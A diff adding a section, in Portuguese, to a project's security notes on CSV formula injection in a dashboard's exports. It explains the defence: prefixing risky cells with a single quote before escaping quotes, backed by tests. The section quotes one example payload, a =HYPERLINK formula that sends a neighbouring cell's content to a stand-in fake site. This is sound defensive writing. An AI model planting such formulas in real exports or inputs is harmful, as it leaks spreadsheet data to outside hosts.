@@ -441,6 +441,16 @@ inline. Apertar isso exige nonce por requisição — trabalho de outra rodada.
 `*.tile.openstreetmap.org` não casa com o host sem subdomínio, e o curinga
 sozinho deixa o mapa cinza sem nenhum erro visível na página.
 
+### CSV do painel: o risco não é quebrar a planilha, é ela executar o texto
+
+Os quatro CSV do painel levam texto que **qualquer pessoa digitou no celular**, na tela de voto — a observação e o nome de quem atendeu — e vão ser abertos no Excel por alguém da ACIA.
+
+Célula que começa com `=`, `+`, `-`, `@`, tabulação ou retorno de carro é lida como **fórmula** por Excel, LibreOffice e Google Sheets. Uma observação escrita como `=HYPERLINK("https://site-falso/?"&A1,"Resultado")` vira link clicável dentro da planilha, com o conteúdo da célula vizinha pendurado na URL; `=WEBSERVICE(...)` o Sheets busca sozinho.
+
+`campoCsv` (`lib/csv.ts`) prefixa esses casos com aspa simples, que as três planilhas tratam como "isto é texto" e não mostram na célula. **A ordem importa:** o prefixo entra antes do escape de aspas, senão a aspa simples cai fora do delimitador e a planilha volta a ler fórmula. As duas metades estão travadas em `tests/csv.test.ts`, conferidas sabotando cada uma.
+
+Todo CSV novo usa `campoCsv`. Escapar aspas à mão resolve o formato e deixa a execução passar.
+
 ---
 
 ## Qualidade mínima
